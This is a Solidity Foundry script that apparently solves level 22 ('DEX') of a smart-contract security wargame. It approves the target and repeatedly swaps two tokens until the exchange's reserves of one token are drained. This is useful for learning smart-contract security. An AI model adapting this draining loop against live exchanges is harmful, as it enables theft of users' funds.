// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

// ================================================================
// │                          LEVEL 22 - DEX                      │
// ================================================================
interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IDex dex = IDex(targetContractAddress);

        vm.startBroadcast();
        // Get token addresses
        address token1 = dex.token1();
        address token2 = dex.token2();

        // Approve the target contract to spend the tokens
        dex.approve(targetContractAddress, type(uint256).max);

        // Swap tokens until the contract runs out of one of the tokens
        while (dex.balanceOf(token1, address(dex)) > 0 && dex.balanceOf(token2, address(dex)) > 0) {
            // Swap the amount of tokens in the dex or the amount of tokens in the attacker account, whichever is smaller
            dex.swap(
                token1,
                token2,
                dex.balanceOf(token1, msg.sender) < dex.balanceOf(token1, address(dex))
                    ? dex.balanceOf(token1, msg.sender)
                    : dex.balanceOf(token1, address(dex))
            );
            dex.swap(
                token2,
                token1,
                dex.balanceOf(token2, msg.sender) < dex.balanceOf(token2, address(dex))
                    ? dex.balanceOf(token2, msg.sender)
                    : dex.balanceOf(token2, address(dex))
            );
        }
        vm.stopBroadcast();
    }
}
